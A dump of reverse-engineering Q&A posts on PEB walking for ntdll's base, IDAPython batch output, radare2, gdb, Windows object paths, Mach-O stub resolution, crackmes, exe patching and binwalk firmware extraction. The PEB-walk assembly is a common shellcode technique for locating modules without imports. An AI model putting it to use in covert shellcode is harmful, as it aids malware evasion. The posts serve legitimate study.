"Where is ntdll.dll?","1767","","<p>I am trying to get the base address of <code>ntdll.dll</code> over the <code>PEB</code>. So, what I did was to dump the <code>PEB</code> (<code>d fs:[30]</code>). Then, I tried to get to <code>PEB_LDR_DATA</code> over the offset <code>0xC</code>. Over the offset <code>0x1C</code> of <code>PEB_LDR_DATA</code> I found the the pointer of <code>InInitializationOrderModuleList</code> and I was told that I can find the <code>ntdll.dll</code> address there. And that I should first find the address of <code>kernel32.dll</code> (which is always the second entry). So, I was able to find the address of <code>kernel32.dll</code> but it seems like I can't find the address of <code>ntdll.dll</code>. </p>

<pre><code>00251ED8  .ܛὈ%Ậ%ὐ%Ẵ%.....@ᐴ@怀.TVٜڔ倀...뉨粘뉨粘趨即....ꮫꮫꮫꮫ......ܨ‐%Ỡ%‘%Ứ%
00251F58  †%Ẽ%.粑Ⱘ粒怀:Ȉ퀨粘⅘粓䀄耈..니粘니粘뾿䠂....ꮫꮫꮫꮫ......ܵC:\WINDOWS\system32\
00251FD8  kernel32.dll.ꮫꮫꮫꮫﻮﻮﻮ......߁⅐%Ὀ%⅘%ὐ%Ⅰ%὘%.粀똾粀耀@Bᾰ%Ῐ%䀄耈..늰粘늰粘뿀䠂
00252058  ....ꮫꮫꮫꮫ.....ߎC:\WINDOWS\WinSxS\x86_Microsoft.VC90.CRT_1fc8b3b
002520D8  9a1e18e3b_9.0.21022.8_x-ww_d08d0375\MSVCR90.dll.ꮫꮫꮫꮫ.....ߩẬ%‐%
00252158  Ẵ%‘%Ẽ%†%.硒ⵀ硔　.¾À⁸%℠%䀆逈..닀粘닀粘㷎䜱....ꮫꮫꮫꮫ....ߊ.ᓮîŸ%Ÿ%ﻮﻮﻮﻮﻮﻮﻮﻮﻮﻮﻮﻮ
</code></pre>

<p>This is the part where I have found the <code>kernel32.dll</code>. But in the fact of that this a linked list. Shouldn't I be able to find <code>ntdll.dll</code> too? </p>

<p>When, I open up the window of ""Executable Modules"" I can see the <code>ntdll.dll</code> but it seem I am not able to find the base address inside of the <code>Struct</code>. </p>

<p>Please tell me if you need clarification or if I am grievously mistaken.</p>
","<p>The code below will set <code>EAX</code> to the image base address of <code>ntdll.dll</code>:</p>

<pre><code>MOV EAX, DWORD PTR FS:[30]     ; EAX = PEB
MOV EAX, DWORD PTR DS:[EAX+0C] ; EAX = PEB-&gt;Ldr
MOV EAX, DWORD PTR DS:[EAX+1C] ; EAX = PEB-&gt;Ldr.InInitializationOrderModuleList.Flink
MOV EAX, DWORD PTR DS:[EAX+8]  ; EAX = image base of ntdll (LDR_MODULE's BaseAddress)
</code></pre>

<p>Based on your question above, it seems like you understand everything through the <code>MOV EAX, DWORD PTR DS:[EAX+1C]</code> instruction. Since <code>ntdll.dll</code> is the first module loaded, it's the first <code>LDR_MODULE</code> entry in <code>InInitializationOrderModuleList</code>. So with <code>EAX</code> pointing to <code>PEB-&gt;Ldr.InInitializationOrderModuleList.Flink</code>, <code>[EAX+0]</code> points to the list entry's <code>Flink</code>, <code>[EAX+4]</code> points to the list entry's <code>Blink</code>, and <code>[EAX+8]</code> is the <code>BaseAddress</code> value of the first <code>LDR_MODULE</code> entry (<code>ntdll.dll</code>'s <code>LDR_MODULE</code>).</p>

<p>This image from <a href=""http://blog.csdn.net/programmingring/article/details/11357393"" rel=""nofollow noreferrer"">http://blog.csdn.net/programmingring/article/details/11357393</a> may help:<img src=""https://i.stack.imgur.com/GVtLO.jpg"" alt=""diagram""></p>

<p>When <code>EAX</code> is set to <code>PEB-&gt;Ldr.InInitializationOrderModuleList.Flink</code>, it's pointing to the orange <code>Flink</code> in the first <code>LDR_MODULE</code> above. It's followed by the <code>Blink</code> at <code>[EAX+4]</code>, and the ""<code>DllBase</code>"" (<code>BaseAddress</code>) at <code>[EAX+8]</code>.</p>
","4466"
"IDA Pro/IDA Python, producing file via terminal","1761","","<p>I am using IDA Pro 6.5 and running it via terminal with the following command line switches:</p>

<ol>
<li>-B (to run in batch mode, should automatically generate a .asm file containing results)</li>
<li>-S running a script in which the only functionality is to convert all of the binary into instruction.</li>
</ol>

<p>When I ran in batch mode prior to the script, it would generate a .asm file that I would then be able to manipulate. However, now this file doesn’t appear. Is there a quick fix or any IDA Python methods I can include in order to create an output file?</p>
","<p>Here it is. 
Run it with idal -c -A -S./script.py ./test.bin</p>

<pre><code># I didn't check this code, please use carefully !
# IDAPython documentation is at https://www.hex-rays.com/products/ida/support/idapython_docs/

import idautils
import idc

for ea in idautils.Segments():
    segend = idc.GetSegmentAttr(ea, idc.SEGATTR_END)
    start = ea
    while start &lt; segend:
        idc.MakeCode(start)
        start = idc.FindUnexplored(start+1, idc.SEARCH_DOWN)

idc.GenerateFile(idc.OFILE_ASM, idc.GetInputFile()+"".asm"", 0, idc.BADADDR, 0)

idc.Exit(0)
</code></pre>
","3396"
"Getting to the entry point using radare2","1750","","<p>How do I get to the entry point of a .exe file using radare2?
I tried using aa then pdf@sym.main, but a prompt showed saying ""Cannot find function at 0x00000000""</p>
","<p>The entrypoint can be found using the info command <code>i?</code> especially the entrypoint info command <code>ie</code></p>

<pre><code>[0x00404890]&gt; ie
[Entrypoints]
vaddr=0x00404890 paddr=0x00004890 baddr=0x00400000 laddr=0x00000000

1 entrypoints
</code></pre>

<p>Alternatively you can use <code>rabin2 -e &lt;file&gt;</code>.</p>
","3939"
"What is the difference between step into and step over when debugging?","1737","","<p>I am using EDB and stepping through the program but I do not even know what the difference in behavior is when doing this.  I feel like this is something I should know if I ever have hope of reverse engineering this program.</p>
","<p>The <code>gdb</code> terms (and commands) are <code>step</code> and <code>next</code> and the difference is that <code>step</code> continues to run until it changes line of source code, while <code>next</code> doesn't trace into a subroutine, but rather skips over it. The <code>stepi</code> and <code>nexti</code> commands are similar but operate at the machine instruction level rather than source code level. Read more in <a href=""https://sourceware.org/gdb/current/onlinedocs/gdb/Continuing-and-Stepping.html#Continuing-and-Stepping"">The Fine Manual</a>.</p>
","4220"
"\??\C:\ Question Marks in Paths","1725","","<p>I often come across paths similar to <code>\??\C:\Windows</code> when looking in memory.  I have been unable to understand why the double '<code>?</code>' is appended to some paths. My google-fu is failing me with the ability to find a reason for the double '<code>?</code>'.Any assistance would be appreciated.</p>
","<p>From <a href=""http://a.co/7DtLqTA"" rel=""nofollow noreferrer"">Windows Internals, Part 1 (6th Edition)</a> --</p>

<blockquote>
  <p>All object-manager functions related to namespace management are aware
  of the instanced directories and participate in providing the illusion
  that all sessions use the same namespace. Windows subsystem DLLs
  prefix names passed by Windows applications that reference objects in
  \DosDevices with <em>\??</em> (for example, C:\Windows becomes \??\C:\Windows).
  When the object manager sees the special \?? prefix, the steps it
  takes depends on the version of Windows, but it always relies on a
  field named <em>DeviceMap</em> in the executive process object (EPROCESS, which
  is described further in Chapter 5) that points to a data structure
  shared by other processes in the same session.</p>
  
  <p>The <em>DosDevicesDirectory</em> field of the <em>DeviceMap</em> structure points at the
  object manager directory that represents the process’ local
  \DosDevices. When the object manager sees a reference to \??, it
  locates the process’ local \DosDevices by using the
  <em>DosDevicesDirectory</em> field of the <em>DeviceMap</em>. If the object manager
  doesn’t find the object in that directory, it checks the <em>DeviceMap</em>
  field of the directory object. If it’s valid, it looks for the object
  in the directory pointed to by the <em>GlobalDosDevicesDirectory</em> field of
  the <em>DeviceMap</em> structure, which is always \Global??.</p>
</blockquote>
","3799"
"Are there any active IRC channels for RCE discussion?","1723","","<p>I enjoy idling in programming related IRC channels so I can research any topic which catches my interest.  I have checked the channels for a few forums that I browse, but I can't seem to find an active community.  What are some active RCE related channels?  It can be about malware analysis / tools / general help / etc, anything.</p>

<p>Hopefully this is on topic.  I can't think of anywhere else to ask.</p>
","<p>On Freenode check out:</p>

<p>""##re""</p>

<p>""##asm""</p>

<p>""#radare""</p>
","8740"
"Is BinNavi available? If not, can I get the source from anywhere?","1721","","<p><a href=""https://www.zynamics.com/binnavi.html"" rel=""nofollow noreferrer"">BinNavi</a> is originally a <a href=""https://www.zynamics.com/"" rel=""nofollow noreferrer"">Zynamics</a> product. But, since the company has been bought by Google, it seems to be difficult to get the library.</p>

<p>I tried to look in the <a href=""https://www.zynamics.com/binnavi/manual/"" rel=""nofollow noreferrer"">BinNavi manual</a> in the <a href=""https://www.zynamics.com/binnavi/manual/html/installation.htm"" rel=""nofollow noreferrer"">installation</a> chapter. But, I couldn't find any way to get the source code or a binary package.</p>

<p>Is there any hope that the code or, at least, a binary form of BinNavi become available at some point ? </p>

<p>And, about the BinNavi API, is it possible to use BinNavi with other languages than REIL or is BinNavi hard linked with it ?</p>

<p><img src=""https://www.zynamics.com/images/binnavi_screenshot_5.png"" alt=""BinNavi Example""></p>
","<p>BinNavi was just <a href=""https://github.com/google/binnavi"" rel=""nofollow"">released as open source</a> today by Google, so you can get it for free.</p>

<p>About using it with something else than REIL, if you're fearless, you can give a try to <a href=""http://radare.org"" rel=""nofollow"">radare2</a>, since it <a href=""https://github.com/radare/radare2/pull/2341"" rel=""nofollow"">can translate</a> its intermediary language <a href=""https://github.com/radare/radare2/wiki/ESIL"" rel=""nofollow"">ESIL</a>, to REIL.</p>
","10658"
"In a Mach-O executable, how can I find which function a stub targets?","1716","","<p>Before exposing my problem, here's my understanding of the whole thing, so that you may correct me if I'm saying something wrong.</p>

<p>In a Mach-O file (at least on x86), the <code>__TEXT.__stubs</code> section typically has stubs in it that all consist of a single indirect jump, like this:</p>

<pre><code>; __TEXT.__stubs
; symbol stub for unlink:
0x100000f46:  jmpq   *0xc4(%rip)
; symbol stub for puts:
0x100000f4c:  jmpq   *0xc6(%rip)
</code></pre>

<p>These point to a location inside the <code>__DATA.__nl_symbol_ptr</code> section. The pointer initially goes to a stub helper in the <code>__TEXT.__stub_helper</code> section:</p>

<pre><code>; __TEXT.__stub_helper
; stub helper for unlink
0x100000f64:  pushq  $0x0
0x100000f69:  jmp    0x100000f54
; stub helper for puts
0x100000f6e:  pushq  $0xe
0x100000f73:  jmp    0x100000f54
</code></pre>

<p>The stub helper calls <code>dyld_stub_binder</code>, which uses the pushed argument to figure out which stub it is and which function it needs to look up, then replaces the value in <code>__DATA.__nl_symbol_ptr</code> with the resolved address, and then hand over control to the function that was found (which then returns to the calling code normally).</p>

<p>To assist debugging, debuggers find stubs and pretend that they have symbols for them. In this example program, whenever lldb sees <code>call 0x100000f58</code>, it determines that the stub should point to <code>unlink</code>, and says <code>call 0x100000f58 ; symbol stub for: unlink</code> in the disassembly.</p>

<p>However, lldb does not use the pushed value: it appears to <a href=""https://github.com/llvm-mirror/lldb/blob/5b0324a42cae28a07bc3683c6757dc1533b8fa0d/source/Plugins/ObjectFile/Mach-O/ObjectFileMachO.cpp#L4375"" rel=""noreferrer"">rely on the static linker placing undefined symbols and stubs in the same order</a>, or some variant of that. Just like that, it looks more like a heuristic than a precise way to figure out which stub goes where, unless there's something else preventing you from tampering.</p>

<p>So how do I reliably find which function is called by a stub? In the stub helpers, what do the constants in <code>pushq $constant</code> mean?</p>
","<p>I <a href=""https://github.com/zneak/fcd/blob/b29b4ac/scripts/macho.py#L307"" rel=""nofollow noreferrer"">wrote</a> a Python script that parses entry points and imports from a Mach-O executable for one of my projects. The trick is to parse the <code>LC_DYLD</code> or <code>LC_DYLD_ONLY</code> loader commands. These two commands encode three import tables: bound symbols, weak symbols, and lazy symbols.</p>

<pre><code>struct dyld_info_command {
  uint32_t cmd;
  uint32_t cmdsize;
  uint32_t rebase_off;
  uint32_t rebase_size;
  uint32_t bind_off;
  uint32_t bind_size;
  uint32_t weak_bind_off;
  uint32_t weak_bind_size;
  uint32_t lazy_bind_off;
  uint32_t lazy_bind_size;
  uint32_t export_off;
  uint32_t export_size;
};
</code></pre>

<p>The interesting fields are <code>bind_off</code>, <code>bind_size</code>, <code>weak_bind_off</code>, <code>weak_bind_size</code>, <code>lazy_bind_off</code> and <code>lazy_bind_size</code>. Each pair encodes the offset and size of a block of data, inside the executable file, that contains the import table opcodes.</p>

<p>Each of these tables can be seen as having four (useful) columns: the segment, segment offset, library name and symbol name. Together, the segment and segment offset indicate the address where the symbol's actual address will be written to (so for instance, if you have <code>__TEXT</code> and 0x40, this conceptually means that <code>*(__TEXT+0x40) == resolvedSymbolAddress</code>).</p>

<p>The table is encoded as a stream of opcodes for compression purposes. The opcodes control a state machine that contains state for a would-be symbol, has operations to manipulate that state, and operations to ""bind"" a symbol (take all that state and make it a part of the symbol table). For instance, you could see:</p>

<ul>
<li>set segment to __TEXT</li>
<li>set offset to 0x40</li>
<li>set library to libSystem.dylib</li>
<li>set symbol name to ""printf""</li>
<li>bind symbol</li>
<li>set offset to 0x48</li>
<li>set symbol name to ""scanf""</li>
<li>bind symbol</li>
</ul>

<p>At the end of this sequence, you get two symbols: printf and scanf, whose addresses are located at __TEXT+0x40 and __TEXT+0x48 respectively, from libSystem.dylib. This means that if you see an instruction like <code>jmp [__TEXT+0x48]</code> (an indirect jump to the address contained at <code>__TEXT+0x48</code>), you know that you're going to <code>scanf</code>. This is how you can tell the destination of stubs.</p>

<p>Each opcode is at least 1 byte, separated as 0xCI (where C is the command name, and I is an immediate value, both 4 bits). When the command needs a larger operand (or more operands), they are encoded in <a href=""https://en.wikipedia.org/wiki/LEB128"" rel=""nofollow noreferrer"">ULEB-128</a> format (except for <code>BIND_OPCODE_SET_ADDEND_SLEB</code>, which uses signed LEB, but we don't really care about it for the purpose of finding imports).</p>

<pre><code>def readUleb(data, offset):
    byte = ord(data[offset])
    offset += 1

    result = byte &amp; 0x7f
    shift = 7
    while byte &amp; 0x80:
        byte = ord(data[offset])
        result |= (byte &amp; 0x7f) &lt;&lt; shift
        shift += 7
        offset += 1
    return (result, offset)
</code></pre>

<p>Libraries aren't actually identified by their names in the command stream. Rather, libraries are identified by their <strong>one-based</strong> ""library ordinal"", which is just the index of the library within all the <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, <code>LC_REEXPORT_DYLIB</code> and <code>LC_LOAD_UPWARD_DYLIB</code> loader commands. For instance, if an executable has a <code>LC_LOAD_DYLIB</code> command for libSystem and then one for libFoobar, libSystem has ordinal 1 and libFoobar has ordinal 2.</p>

<p>There are three special values: ordinal -2 means that the symbol is looked up in the flat namespace (first library with a symbol with that name wins); ordinal -1 looks for a symbol in the main executable, whatever it is; and ordinal 0 looks for a symbol within this file. As we've said above, ordinal 1 and above refer to libraries.</p>

<p>Symbol names are encoded within the command blob as null-terminated strings.</p>

<p>Each opcode is easily described in code, so I'll spare us the description of each.   </p>

<pre><code>BIND_OPCODE_DONE = 0
BIND_OPCODE_SET_DYLIB_ORDINAL_IMM = 1
BIND_OPCODE_SET_DYLIB_ORDINAL_ULEB = 2
BIND_OPCODE_SET_DYLIB_SPECIAL_IMM = 3
BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM = 4
BIND_OPCODE_SET_TYPE_IMM = 5
BIND_OPCODE_SET_ADDEND_SLEB = 6
BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB = 7
BIND_OPCODE_ADD_ADDR_ULEB = 8
BIND_OPCODE_DO_BIND = 9
BIND_OPCODE_DO_BIND_ADD_ADDR_ULEB = 10
BIND_OPCODE_DO_BIND_ADD_ADDR_IMM_SCALED = 11
BIND_OPCODE_DO_BIND_ULEB_TIMES_SKIPPING_ULEB = 12

def parseImports(self, offset, size):
    pointerWidth = self.bitness / 8
    slice = self.data[offset:offset+size]
    index = 0

    name = """"
    segment = 0
    segmentOffset = 0
    libOrdinal = 0

    stubs = []
    def addStub():
        stubs.append((segment, segmentOffset, libOrdinal, name))

    while index != len(slice):
        byte = ord(slice[index])
        opcode = byte &gt;&gt; 4
        immediate = byte &amp; 0xf
        index += 1

        if opcode == BIND_OPCODE_DONE:
            pass
        elif opcode == BIND_OPCODE_SET_DYLIB_ORDINAL_IMM:
            libOrdinal = immediate
        elif opcode == BIND_OPCODE_SET_DYLIB_ORDINAL_ULEB:
            libOrdinal, index = self.__readUleb(slice, index)
        elif opcode == BIND_OPCODE_SET_DYLIB_SPECIAL_IMM:
            libOrdinal = -immediate
        elif opcode == BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM:
            nameEnd = slice.find(""\0"", index)
            name = slice[index:nameEnd]
            index = nameEnd
        elif opcode == BIND_OPCODE_SET_TYPE_IMM:
            pass
        elif opcode == BIND_OPCODE_SET_ADDEND_SLEB:
            _, index = self.__readUleb(slice, index)
        elif opcode == BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB:
            segment = immediate
            segmentOffset, index = self.__readUleb(slice, index)
        elif opcode == BIND_OPCODE_ADD_ADDR_ULEB:
            addend, index = self.__readUleb(slice, index)
            segmentOffset += addend
        elif opcode == BIND_OPCODE_DO_BIND:
            addStub()
        elif opcode == BIND_OPCODE_DO_BIND_ADD_ADDR_ULEB:
            addStub()
            addend, index = self.__readUleb(slice, index)
            segmentOffset += addend
        elif opcode == BIND_OPCODE_DO_BIND_ADD_ADDR_IMM_SCALED:
            addStub()
            segmentOffset += immediate * pointerWidth
        elif opcode == BIND_OPCODE_DO_BIND_ULEB_TIMES_SKIPPING_ULEB:
            times, index = self.__readUleb(slice, index)
            skip, index = self.__readUleb(slice, index)
            for i in range(times):
                addStub()
                segmentOffset += pointerWidth + skip
        else:
            sys.stderr.write(""warning: unknown bind opcode %u, immediate %u\n"" % (opcode, immediate))
</code></pre>
","14064"
"Crack Me Material","1715","","<p>I'd like to get started with reverse engineering.
Some years ago I've seen many many program, so called ""crack mes"" to crack.
When I searched for some this week I've found none.</p>

<p>My Question is, can somebody recommend some Website (Crack Me walkthrough) / Learn resources to get started with reverse engineering?</p>
","<p>Here are a bunch:</p>

<ul>
<li><a href=""https://tuts4you.com/download.php?list.17"" rel=""nofollow noreferrer"">https://tuts4you.com/download.php?list.17</a></li>
<li><a href=""https://github.com/fdivrp/awesome-reversing/"" rel=""nofollow noreferrer"">https://github.com/fdivrp/awesome-reversing/</a></li>
<li><a href=""https://github.com/michalmalik/linux-re-101"" rel=""nofollow noreferrer"">https://github.com/michalmalik/linux-re-101</a></li>
<li><a href=""https://tuts4you.com/download.php"" rel=""nofollow noreferrer"">https://tuts4you.com/download.php</a></li>
<li><a href=""http://jackson.thuraisamy.me/re-resources.html"" rel=""nofollow noreferrer"">http://jackson.thuraisamy.me/re-resources.html</a></li>
<li><a href=""https://github.com/RPISEC/MBE"" rel=""nofollow noreferrer"">https://github.com/RPISEC/MBE</a></li>
<li><a href=""https://github.com/Maijin/Workshop2015/tree/master/IOLI-crackme"" rel=""nofollow noreferrer"">https://github.com/Maijin/Workshop2015/tree/master/IOLI-crackme</a></li>
<li><a href=""https://hackcenter.com/sign-in"" rel=""nofollow noreferrer"">https://hackcenter.com/sign-in</a></li>
<li><a href=""https://www.root-me.org/en/Challenges/Cracking/"" rel=""nofollow noreferrer"">https://www.root-me.org/en/Challenges/Cracking/</a></li>
<li><a href=""https://www.wechall.net/active_sites"" rel=""nofollow noreferrer"">https://www.wechall.net/active_sites</a></li>
<li><a href=""http://www.wechall.net/challs/"" rel=""nofollow noreferrer"">http://www.wechall.net/challs/</a></li>
<li><a href=""https://challenges.re/"" rel=""nofollow noreferrer"">https://challenges.re/</a></li>
<li><a href=""https://github.com/s7ephen/CSAW_2009"" rel=""nofollow noreferrer"">https://github.com/s7ephen/CSAW_2009</a></li>
<li><a href=""https://github.com/isislab/Hack-Night/tree/master/2013-Fall#week-6-reverse-engineering-part-1"" rel=""nofollow noreferrer"">https://github.com/isislab/Hack-Night/tree/master/2013-Fall#week-6-reverse-engineering-part-1</a></li>
<li><a href=""http://pwnable.kr/"" rel=""nofollow noreferrer"">http://pwnable.kr/</a></li>
<li><a href=""https://w3challs.com/"" rel=""nofollow noreferrer"">https://w3challs.com/</a></li>
<li><a href=""http://io.netgarage.org/"" rel=""nofollow noreferrer"">http://io.netgarage.org/</a></li>
<li><a href=""http://rogerfm.net/challenge/crackme/index.htm"" rel=""nofollow noreferrer"">http://rogerfm.net/challenge/crackme/index.htm</a></li>
<li><a href=""https://gironsec.com/cactuscon_re_challenges/index.php"" rel=""nofollow noreferrer"">https://gironsec.com/cactuscon_re_challenges/index.php</a></li>
<li><a href=""https://cryptocult.wordpress.com/cyber-challenges/"" rel=""nofollow noreferrer"">https://cryptocult.wordpress.com/cyber-challenges/</a></li>
<li><a href=""http://www.reteam.org/challenges.html"" rel=""nofollow noreferrer"">http://www.reteam.org/challenges.html</a></li>
<li><a href=""https://github.com/rshipp/awesome-malware-analysis"" rel=""nofollow noreferrer"">https://github.com/rshipp/awesome-malware-analysis</a></li>
<li><a href=""http://crackmes.cf"" rel=""nofollow noreferrer"">http://crackmes.cf</a></li>
<li><a href=""https://0x00sec.org/t/challenge-collection-reverse-engineering-and-crackme/3027"" rel=""nofollow noreferrer"">https://0x00sec.org/t/challenge-collection-reverse-engineering-and-crackme/3027</a></li>
</ul>
","15775"
"adding data and code to existing .exe file on Windows","1707","","<p>I am trying to add new functionality to a hard-coded exe of a game like adding  new creatures and new spells and adding spells to creatures that did not have them before. For that I need to significantly modify the exe.</p>

<p>It should be theoretically possible to expand an exe file somehow by increasing its binary size. Browsing on the internet I have stumbled upon this tool:<strong><a href=""http://www.cgsoftlabs.ro/studpe.html"" rel=""nofollow"">http://www.cgsoftlabs.ro/studpe.html</a></strong></p>

<p>Since I am a RE and assembly newbie I do not get at all how this operates and how I could expand an exe using this.</p>

<p><strong>I have heard about some tools that make this possible on Linux. Are there Windows equivalents?</strong></p>

<p>Alternatively, maybe I could use some sort of dll injection to expand the .exe? Or maybe add functionality through some hooking?</p>
","<p>Sure its possible to increase exe size (that's the trivial part) you just need to add new section to section table. 
I recommend <a href=""http://www.ntcore.com/exsuite.php"" rel=""nofollow"">CFF explorer</a> 
IMHO the best PE view/edit tool.
Invoke context menu from section headers (on the right side) to add new section then fill it with the code, data you want. Next you need to reverse the game and see how its structured and where to patch the code so it will jump to your code. For dll injection you could use <a href=""http://www.cheatengine.org/"" rel=""nofollow"">Cheat engine</a> they have a very nice tutorial but you still need to reverse the game and write injection code.dll.</p>
","11407"
"Unpack IpCam firmware - Binwalk extraction issue","1698","","<p>I'm trying to use Binwalk to extract an IpCam bin firmware. I did it successfully for the WebUI, but I can't on the firmware itself.</p>

<ul>
<li>Hardware : Vstarcam C7824WIP</li>
<li>Firmware : <a href=""http://cd.gocam.so/FM/system/CH-sys-48.53.64.67.zip"" rel=""nofollow"">CH-sys-48.53.64.67.zip</a></li>
<li>WebUI : <a href=""http://cd.gocam.so/FM/vstarcam/CH-app-EN53.8.1.13_VSTARCAM.zip"" rel=""nofollow"">CH-app-EN53.8.1.13_VSTARCAM.zip</a></li>
</ul>

<p>Problem : It's only extracting ""sysversion.txt, a bit light :).</p>

<p>Files :</p>

<pre><code>ron@vpsXXXXXX:~/firmware$ ls
CH-sys-48.53.64.67.zip
</code></pre>

<p>Verification and extraction :</p>

<pre><code>ron@vpsXXXXXX:~/firmware$ binwalk CH-sys-48.53.64.67.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 605571, uncompressed size: 612699, name: CH-sys-48.53.64.67.bin
605717        0x93E15         End of Zip archive

ron@vpsXXXXXX:~/firmware$ file CH-sys-48.53.64.67.zip
CH-sys-48.53.64.67.zip: Zip archive data, at least v2.0 to extract
ron@vpsXXXXXX:~/firmware$ unzip CH-sys-48.53.64.67.zip
Archive:  CH-sys-48.53.64.67.zip
  inflating: CH-sys-48.53.64.67.bin
</code></pre>

<p>Binwalk without extracting :</p>

<pre><code>ron@vpsXXXXXX:~/firmware$ binwalk CH-sys-48.53.64.67.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
172           0xAC            Zip archive data, at least v2.0 to extract, compressed size: 8969, uncompressed size: 19091, name: system/system/lib/libsns_gc1004.so
9337          0x2479          End of Zip archive
9499          0x251B          Zip archive data, at least v2.0 to extract, compressed size: 7813, uncompressed size: 16341, name: system/system/lib/libsns_ov9712_plus.so
17518         0x446E          End of Zip archive
17680         0x4510          Zip archive data, at least v2.0 to extract, compressed size: 90121, uncompressed size: 353248, name: system/system/lib/libOnvif.so
107987        0x1A5D3         End of Zip archive
108149        0x1A675         Zip archive data, at least v2.0 to extract, compressed size: 43603, uncompressed size: 84480, name: system/system/lib/libvoice_arm.so
151946        0x2518A         End of Zip archive
152108        0x2522C         Zip archive data, at least v2.0 to extract, compressed size: 130, uncompressed size: 227, name: system/init/ipcam.sh
152406        0x25356         End of Zip archive
152568        0x253F8         Zip archive data, at least v2.0 to extract, compressed size: 402383, uncompressed size: 886168, name: system/system/bin/encoder
555129        0x87879         End of Zip archive
555291        0x8791B         Zip archive data, at least v2.0 to extract, compressed size: 35394, uncompressed size: 74200, name: system/system/bin/wifidaemon
590869        0x90415         End of Zip archive
591031        0x904B7         Zip archive data, at least v2.0 to extract, compressed size: 1852, uncompressed size: 9692, name: system/system/bin/grade.sh
593063        0x90CA7         End of Zip archive
593225        0x90D49         Zip archive data, at least v2.0 to extract, compressed size: 8704, uncompressed size: 20212, name: system/system/bin/updata
602105        0x92FF9         End of Zip archive
602267        0x9309B         Zip archive data, at least v2.0 to extract, compressed size: 1874, uncompressed size: 4522, name: system/system/bin/gpio_aplink.ko
604333        0x938AD         End of Zip archive
604495        0x9394F         Zip archive data, at least v2.0 to extract, compressed size: 7241, uncompressed size: 16802, name: system/system/bin/motogpio.ko
611922        0x95652         End of Zip archive
612084        0x956F4         Zip archive data, at least v1.0 to extract, compressed size: 8, uncompressed size: 8, name: system/system/bin/fwversion.bin
612282        0x957BA         End of Zip archive
612444        0x9585C         Zip archive data, at least v1.0 to extract, compressed size: 9, uncompressed size: 9, name: system/system/bin/sysversion.txt
612645        0x95925         End of Zip archive
</code></pre>

<p>Binwalk extraction : </p>

<pre><code>ron@vpsXXXXXX:~/firmware$ binwalk -Mer CH-sys-48.53.64.67.bin

Scan Time:     2016-01-19 00:36:12
Target File:   /home/ron/firmware/CH-sys-48.53.64.67.bin
MD5 Checksum:  58df9214226cfe46760215bfca0c496c
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
172           0xAC            Zip archive data, at least v2.0 to extract, compressed size: 8969, uncompressed size: 19091, name: system/system/lib/libsns_gc1004.so
9337          0x2479          End of Zip archive
9499          0x251B          Zip archive data, at least v2.0 to extract, compressed size: 7813, uncompressed size: 16341, name: system/system/lib/libsns_ov9712_plus.so
17518         0x446E          End of Zip archive
17680         0x4510          Zip archive data, at least v2.0 to extract, compressed size: 90121, uncompressed size: 353248, name: system/system/lib/libOnvif.so
107987        0x1A5D3         End of Zip archive
108149        0x1A675         Zip archive data, at least v2.0 to extract, compressed size: 43603, uncompressed size: 84480, name: system/system/lib/libvoice_arm.so
151946        0x2518A         End of Zip archive
152108        0x2522C         Zip archive data, at least v2.0 to extract, compressed size: 130, uncompressed size: 227, name: system/init/ipcam.sh
152406        0x25356         End of Zip archive
152568        0x253F8         Zip archive data, at least v2.0 to extract, compressed size: 402383, uncompressed size: 886168, name: system/system/bin/encoder
555129        0x87879         End of Zip archive
555291        0x8791B         Zip archive data, at least v2.0 to extract, compressed size: 35394, uncompressed size: 74200, name: system/system/bin/wifidaemon
590869        0x90415         End of Zip archive
591031        0x904B7         Zip archive data, at least v2.0 to extract, compressed size: 1852, uncompressed size: 9692, name: system/system/bin/grade.sh
593063        0x90CA7         End of Zip archive
593225        0x90D49         Zip archive data, at least v2.0 to extract, compressed size: 8704, uncompressed size: 20212, name: system/system/bin/updata
602105        0x92FF9         End of Zip archive
602267        0x9309B         Zip archive data, at least v2.0 to extract, compressed size: 1874, uncompressed size: 4522, name: system/system/bin/gpio_aplink.ko
604333        0x938AD         End of Zip archive
604495        0x9394F         Zip archive data, at least v2.0 to extract, compressed size: 7241, uncompressed size: 16802, name: system/system/bin/motogpio.ko
611922        0x95652         End of Zip archive
612084        0x956F4         Zip archive data, at least v1.0 to extract, compressed size: 8, uncompressed size: 8, name: system/system/bin/fwversion.bin
612282        0x957BA         End of Zip archive
612444        0x9585C         Zip archive data, at least v1.0 to extract, compressed size: 9, uncompressed size: 9, name: system/system/bin/sysversion.txt
612645        0x95925         End of Zip archive


Scan Time:     2016-01-19 00:36:12
Target File:   /home/ron/firmware/_CH-sys-48.53.64.67.bin.extracted/system/system/bin/sysversion.txt
MD5 Checksum:  3e98d83fbced8eb62c79542f5df5a14f
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
</code></pre>

<p>Only one target file extracted...</p>

<p>A quick look to headers :</p>

<pre><code>ron@vpsXXXXXX:~/firmware$ head -n1 CH-sys-48.53.64.67.bin | hexdump -C
00000000  77 77 77 2e 6f 62 6a 65  63 74 2d 63 61 6d 65 72  |www.object-camer|
00000010  61 2e 63 6f 6d 2e 62 79  2e 68 6f 6e 67 7a 78 2e  |a.com.by.hongzx.|
00000020  73 79 73 74 65 6d 2f 73  79 73 74 65 6d 2f 6c 69  |system/system/li|
00000030  62 2f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |b/..............|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000060  6c 69 62 73 6e 73 5f 67  63 31 30 30 34 2e 73 6f  |libsns_gc1004.so|
00000070  2e 7a 69 70 00 00 00 00  00 00 00 00 00 00 00 00  |.zip............|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000000a0  e3 23 00 00 43 40 35 30  00 00 00 00 50 4b 03 04  |.#..C@50....PK..|
